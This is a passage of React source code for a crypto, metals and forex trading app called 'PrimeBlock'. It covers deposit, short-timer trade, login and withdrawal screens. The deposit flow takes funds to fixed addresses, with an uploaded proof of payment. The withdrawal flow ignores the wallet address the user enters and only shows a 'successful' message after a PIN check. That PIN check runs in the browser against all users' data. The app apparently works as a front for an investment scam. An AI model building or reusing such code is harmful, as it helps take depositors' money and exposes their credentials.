        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
          <div className="coin-meta"><strong>{t('depositTitle')}</strong></div>
          <div style={{width:'40px'}}></div>
        </header>
        {depositSubmitted && <div className="deposit-banner">{t('submissionReceived')}</div>}
        <div className="deposit-page-content">
          <div className="deposit-instructions">
            <h2>{t('ledgerTitle')}</h2>
            <p>{t('depositNotice')}</p>
          </div>
          <form className="deposit-form" onSubmit={handleDepositSubmit}>
            <label>{t('depositAsset')}</label>
            <select className="login-input" value={selectedCurrency} onChange={(e) => setSelectedCurrency(e.target.value)}>
              {depositAssets.map(asset => <option key={asset.name} value={asset.name}>{asset.name}</option>)}
            </select>
            <label>{t('depositAddress')}</label>
            <div className="deposit-address-display">{depositAssets.find(a => a.name === selectedCurrency)?.address}</div>
            <button type="button" className="copy-btn" onClick={() => handleCopy(depositAssets.find(a => a.name === selectedCurrency)?.address)}>{copyStatus[depositAssets.find(a => a.name === selectedCurrency)?.address] || t('copy')}</button>
            <label>{t('amount')}</label>
            <input className="login-input" type="number" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} placeholder={t('amount')} />
            <label>{t('uploadProof')}</label>
            <label className="upload-button">
              {proofFile ? proofFile.name : t('uploadPlaceholder')}
              <input type="file" accept="image/*" onChange={(e) => setProofFile(e.target.files[0] || null)} hidden />
            </label>
            <button className="buy-btn" type="submit">{t('submitDeposit')}</button>
          </form>
          <div className="customer-service-note">
            <span>🎧 {t('customerServiceLink')} {t('customerService')}</span>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'trade' && selectedCoin) {
    return (
      <div className="trade-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Home</button>
          <div className="coin-meta"><strong>{selectedCoin.symbol.toUpperCase()}/USDT</strong></div>
          <div className="live-price-top">${selectedCoin.current_price.toLocaleString()}</div>
        </header>
        {isTrading && <div className="countdown-overlay"><div className="timer-circle"><span className="time-left">{countdown}s</span></div></div>}
        
        {/* Market Stats */}
        {coinStats && (
          <div className="market-stats">
            <div className={`stat-box ${coinStats.trend === 'up' ? 'trend-up' : 'trend-down'}`}>
              <span className="stat-label">24h Trend</span>
              <span className="stat-value">{coinStats.trend === 'up' ? '📈' : '📉'} {coinStats.changePercent}%</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h High</span>
              <span className="stat-value">${coinStats.high24h.toLocaleString()}</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h Low</span>
              <span className="stat-value">${coinStats.low24h.toLocaleString()}</span>
            </div>
            <div className={`stat-box ${coinStats.rsi > 70 ? 'overbought' : coinStats.rsi < 30 ? 'oversold' : ''}`}>
              <span className="stat-label">RSI</span>
              <span className="stat-value">{coinStats.rsi}</span>
            </div>
          </div>
        )}

        {/* Candlestick Chart and Sidebar */}
        <div className="chart-and-sidebar">
          <div className="chart-container" ref={chartContainerRef}>
            <div style={{padding: '15px', fontSize: '12px', color: '#999', textAlign: 'center'}}>30-Day Candlestick Chart</div>
            <CandlestickChart data={ohlcData} width={300} height={280} />
          </div>
          <div className="chart-sidebar">
            <div className="sidebar-item">
              <span className="sidebar-label">Current Price</span>
              <span className="sidebar-value">${selectedCoin.current_price.toLocaleString()}</span>
            </div>
            <div className="sidebar-item">
              <span className="sidebar-label">Server Time</span>
              <span className="sidebar-value">{currentTime}</span>
            </div>
          </div>
        </div>

        {/* Trade Controls */}
        <div className="trade-controls">
          <div className="control-row">{[30, 60, 90, 120].map(t => (<button key={t} className={tradeConfig.time === t ? 'active' : ''} onClick={() => setTradeConfig({...tradeConfig, time: t})}>{t}s</button>))}</div>
          <div className="amount-section">
            <div className="amount-header"><span>Investment</span><span className="available-bal">Available: ${isLoggedIn ? allUsers[activeId].balance.toLocaleString() : '0.00'}</span></div>
            <div className="amount-input-wrapper">
              <span className="currency-prefix">$</span>
              <input type="number" value={tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: Number(e.target.value)})} className="advanced-input" />
              <div className="min-amount">Min: ${tradeOptions[tradeConfig.time]?.minAmount || 0}</div>
            </div>
          </div>
          <div className="action-btns"><button className="long-btn" onClick={() => startTrade('Long')} disabled={isTrading}>LONG</button><button className="short-btn" onClick={() => startTrade('Short')} disabled={isTrading}>SHORT</button></div>
        </div>

        <TradeResultModal
          isOpen={showResultModal}
          onClose={() => setShowResultModal(false)}
          tradeResult={tradeResult}
        />
      </div>
    );
  }

  // Show loading while users data is being fetched from Firestore
  if (isLoadingUsers) {
    return (
      <div className="app-wrapper">
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', flexDirection: 'column' }}>
          <div style={{ fontSize: '24px', marginBottom: '20px' }}>🔄</div>
          <div>{t('loadingUserData')}</div>
        </div>
      </div>
    );
  }

  return (
    <div className="app-wrapper">
      <header className="header">
        <div className="header-left">
          <div className="hamburger" onClick={() => setDrawerOpen(true)}>☰</div>
          <div className="brand-name">PrimeBlock</div>
        </div>
        <div className="header-icons">
          <div className="header-icon" onClick={() => setCurrentPage('settings')}>⚙️</div>
          <div className="header-icon" onClick={() => isLoggedIn ? setCurrentPage('profile') : setShowAuth(true)}>👤</div>
        </div>
      </header>

      {/* Side Drawer */}
      {drawerOpen && (
        <div className="side-drawer-overlay" onClick={() => setDrawerOpen(false)}>
          <div className={`side-drawer ${drawerOpen ? 'open' : ''}`} onClick={(e) => e.stopPropagation()}>
            <button className="drawer-close" onClick={() => setDrawerOpen(false)}>×</button>
            {isLoggedIn && (
              <div className="drawer-profile">
                <div className="drawer-avatar">👤</div>
                <div className="drawer-info">
                  <h4>{allUsers[activeId]?.name}</h4>
                  <p>UID: {allUsers[activeId]?.id}</p>
                </div>
              </div>
            )}
            <div className="drawer-section">
              <h5>Home</h5>
              <div className="drawer-item" onClick={() => { setCurrentPage('home'); setDrawerOpen(false); }}>🏠 Home</div>
            </div>
            <div className="drawer-section">
              <h5>Market Assets</h5>
              <div className="drawer-item" onClick={() => { setMarketTab('crypto'); setCurrentPage('home'); setDrawerOpen(false); }}>🚀 Crypto</div>
              <div className="drawer-item" onClick={() => { setMarketTab('metals'); setCurrentPage('home'); setDrawerOpen(false); }}>🏦 Metals</div>
              <div className="drawer-item" onClick={() => { setMarketTab('forex'); setCurrentPage('home'); setDrawerOpen(false); }}>💱 Forex</div>
            </div>
            <div className="drawer-section">
              <h5>Account Actions</h5>
              <div className="drawer-item" onClick={() => { setCurrentPage('deposit'); setDrawerOpen(false); }}>💎 Deposit</div>
              <div className="drawer-item" onClick={() => { isLoggedIn ? setShowWithdraw(true) : setShowAuth(true); setDrawerOpen(false); }}>💸 Withdraw</div>
            </div>
            <div className="drawer-section">
              <h5>Customer Service</h5>
              <div className="drawer-item" onClick={() => { window.open(telegramLink); setDrawerOpen(false); }}>🎧 Support</div>
              {isLoggedIn && <div className="drawer-item logout" onClick={() => { setIsLoggedIn(false); setActiveId(null); setCurrentPage('home'); setDrawerOpen(false); }}>🚪 Logout</div>}
            </div>
          </div>
        </div>
      )}

      <main className="main-content">
        <div className="market-tabs-container">
          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>{t('crypto')}</div>
          <div className={`tab-item ${marketTab === 'metals' ? 'active-metals' : ''}`} onClick={() => setMarketTab('metals')}>{t('metals')}</div>
          <div className={`tab-item ${marketTab === 'forex' ? 'active-forex' : ''}`} onClick={() => setMarketTab('forex')}>{t('forex')}</div>
        </div>
        <div className="dashboard-container">
          {loading ? <div className="loading">{t('loadingMarkets')}</div> : (
          <table className="crypto-table">
            <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
            <tbody>{availableMarkets().map(asset => (
              <tr key={asset.id} className="price-row">
                <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
                <td style={{textAlign:'center'}} className="price-flash">${asset.current_price.toLocaleString()}</td>
                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>{t('trade')}</button></td>
              </tr>))}
            </tbody>
          </table>
          )}
        </div>
      </main>

      {/* Floating Support Button */}
      {currentPage === 'home' && <div className="floating-support" onClick={() => window.open(telegramLink)}>🎧</div>}

      {/* --- MODALS --- */}
      {showAuth && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? t('login') : t('signUp')}</h2>
          {isLoadingUsers ? (
            <div style={{ textAlign: 'center', padding: '20px' }}>
              <div style={{ fontSize: '24px', marginBottom: '10px' }}>🔄</div>
              <div>{t('loadingUserData')}</div>
            </div>
          ) : (
            <form onSubmit={handleAuth}>
              {authMode === 'signup' && <input className="login-input" placeholder="Full Name" required onChange={e => setAuthData({...authData, name: e.target.value})} />}
              <input className="login-input" type="email" placeholder="Email" required onChange={e => setAuthData({...authData, email: e.target.value})} />
              <input className="login-input" type="password" placeholder="Password" required onChange={e => setAuthData({...authData, password: e.target.value})} />
              {authMode === 'signup' && <input className="login-input" maxLength="4" placeholder="Withdrawal PIN (4 digits)" required onChange={e => setAuthData({...authData, pin: e.target.value})} />}
              <button className="buy-btn" type="submit" disabled={isLoadingUsers}>{authMode === 'login' ? t('login') : t('signUp')}</button>
            </form>
          )}
          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? t('createAccount') : t('backToLogin')}</p></div></div>
      )}

      {showWithdraw && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>{t('withdrawAssets')}</h2>
          <input className="login-input" type="number" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} placeholder="Amount (USDT)" />
          <input className="login-input" placeholder="Wallet Address (TRC20)" />
          <input className="login-input" type="password" maxLength="4" placeholder="Security PIN" onChange={e => setWithdrawPin(e.target.value)} />
          {Number(withdrawAmount) > allUsers[activeId].balance && <div className="error-message">Insufficient Balance</div>}
          <button className="buy-btn" disabled={Number(withdrawAmount) > allUsers[activeId].balance} onClick={() => { if(withdrawPin === allUsers[activeId].pin) {setWithdrawSuccess(true); setShowWithdraw(false); setWithdrawAmount(''); setWithdrawPin('');} else {alert("Wrong PIN");} }}>{t('verifySubmit')}</button></div></div>
      )}

      {withdrawSuccess && (
        <div className="modal-overlay"><div className="modal-content success-modal"><button className="close-btn" onClick={() => setWithdrawSuccess(false)}>×</button><h2>Withdraw Submission Successful</h2><p>Your withdrawal request has been submitted and is being processed.</p></div></div>
      )}

      {showResultModal && tradeResult && (
        <TradeResultModal
          isOpen={showResultModal}
          onClose={() => setShowResultModal(false)}
          tradeResult={tradeResult}
        />
      )}
    </div>
  );
}

export default App; 
